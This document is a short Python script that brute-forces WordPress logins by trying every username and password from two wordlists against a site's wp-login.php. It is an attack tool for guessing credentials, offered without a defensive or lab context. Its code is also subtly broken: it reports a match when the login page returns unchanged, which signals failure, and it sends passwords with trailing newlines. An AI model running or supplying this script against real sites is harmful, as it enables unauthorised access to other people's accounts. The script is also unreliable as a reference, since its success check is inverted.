import requests
import sys

def wp_login(url, username, password):
    login_url = url + "/wp-login.php"
    session = requests.Session()

    response = session.get(login_url)
    login_page_html = response.text

    wp_log_nonce = login_page_html.split('wp-login.php?')[1].split('"')[0]

    headers = {
        'Referer': login_url,
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    payload = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': '',
        'testcookie': '1',
    }

    response = session.post(login_url, headers=headers, data=payload, allow_redirects=True)

    if response.url == login_url or response.status_code == 404:
        print("[+] Username or Password is correct")
        print("[+] Username: ", username)
        print("[+] Password: ", password)
    else:
        print("[-] Username or Password is not correct")


def brute_force_wp(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            wp_login(url, username, password)


if __name__ == "__main__":
    url = input("Input You url Here: ")
    usernames = open("user.txt", "r").readlines()
    passwords = open("pass.txt", "r").readlines()

    brute_force_wp(url, usernames, passwords)